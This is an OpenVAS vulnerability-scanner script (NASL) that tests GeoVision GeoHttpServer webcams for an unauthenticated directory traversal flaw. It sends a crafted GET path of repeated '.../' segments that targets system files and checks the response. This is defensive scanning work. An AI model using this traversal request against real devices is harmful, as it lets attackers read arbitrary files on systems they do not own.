###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_geovision_geohttpserver_dir_trav_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# GeoVision GeoHttpServer WebCams Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805072");
  script_version("$Revision: 7577 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2015-06-25 15:49:40 +0530 (Thu, 25 Jun 2015)");
  script_name("GeoVision GeoHttpServer WebCams Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"This host is running GeoVision GeoHttpServer
  WebCams and is prone to directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read local file or not.");

  script_tag(name:"insight", value:"The flaw allows unauthenticated attackers to
  download arbitrary files through path traversal.");

  script_tag(name:"impact", value:"Successful exploitation will allow
  remote attackers to read arbitrary files on the target system.

  Impact Level: Application");

  script_tag(name:"affected", value:"GeoVision GeoHttpServer 8.3.3.0");

  script_tag(name:"solution", value:"No solution or patch was made available
  for at least one year since disclosure of this vulnerability. Likely none will
  be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another
  one.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name : "URL" , value : "https://www.exploit-db.com/exploits/37258");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 81);
  script_mandatory_keys("GeoHttpServer/banner");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
files = "";
GeoHttpPort = "";

## Get http port
GeoHttpPort = get_http_port(default:81);

## Check Banner And Confirm Application
banner = get_http_banner(port:GeoHttpPort);
if("Server: GeoHttpServer" >!< banner) {
  exit(0);
}

## traversal_files() function Returns Dictionary (i.e key value pair)
## Get Content to be checked and file to be check
files = traversal_files();
foreach file (keys(files))
{
  ## Construct directory traversal attack
  url = "/" + crap(data:".../",length:3*5) + "/" + files[file];

  ##  Confirm exploit worked properly or not
  if(http_vuln_check(port:GeoHttpPort, url:url, pattern:file))
  {
    report = report_vuln_url( port:GeoHttpPort, url:url );
    security_message(port:GeoHttpPort, data:report);
    exit(0);
  }
}
